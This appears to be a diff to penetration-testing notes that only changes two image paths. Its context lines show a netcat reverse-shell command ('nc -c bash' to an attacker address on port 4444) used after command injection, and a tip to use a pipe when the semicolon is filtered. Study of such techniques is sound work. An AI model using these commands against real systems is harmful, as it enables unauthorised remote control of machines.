@@ -150,7 +150,7 @@ The second command established a reverse shell back to the attacker's machine.
 nc -c bash 192.168.227.128 4444
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260428161322.png)
+![](../../../Images/Pasted%20image%2020260428161322.png)
 
 ---
 
@@ -158,7 +158,7 @@ nc -c bash 192.168.227.128 4444
 
 If the application filters the semicolon (`;`), another separator such as the **pipe (`|`)** may be used depending on how the application executes commands.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260428161559.png)
+![](../../../Images/Pasted%20image%2020260428161559.png)
 
 ---
 
